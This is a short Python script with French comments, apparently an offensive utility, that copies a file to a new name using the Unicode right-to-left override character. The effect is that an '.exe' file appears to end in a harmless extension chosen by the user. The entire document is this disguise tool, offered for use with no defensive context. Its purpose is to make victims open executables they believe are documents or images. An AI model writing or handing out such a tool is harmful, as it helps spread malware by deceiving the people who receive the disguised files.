import shutil
import os

class ExtensionHider:
    def __init__(self):
        self.intro()

    def intro(self):
        print("Outil de masquage d'extension pour Windows")
        print("Crée un fichier avec une extension visuellement modifiée.\n")

    def get_user_input(self):
        self.original_file = input("Entrez le nom du fichier à modifier (avec son extension) : ")
        self.fake_extension = input("Entrez l'extension à afficher : ")
        self.process_file()

    def process_file(self):
        # Construction du nouveau nom de fichier en inversant l'ordre des caractères de l'extension factice
        # et en ajoutant le caractère spécial U+202E pour inverser l'ordre d'affichage
        reversed_fake_ext = self.fake_extension[::-1]
        special_char = '\u202e'  # RIGHT-TO-LEFT OVERRIDE (RLO) character
        new_filename = f"{self.original_file}{special_char}{reversed_fake_ext}.exe"

        # Copie du fichier original vers le nouveau fichier avec l'extension masquée
        try:
            shutil.copyfile(self.original_file, new_filename)
            full_path = os.path.abspath(new_filename)
            print(f"\n[+] Fichier créé avec succès : {full_path}")
        except Exception as e:
            print(f"Erreur lors de la création du fichier : {e}")

def main():
    tool = ExtensionHider()
    tool.get_user_input()

if __name__ == "__main__":
    main()
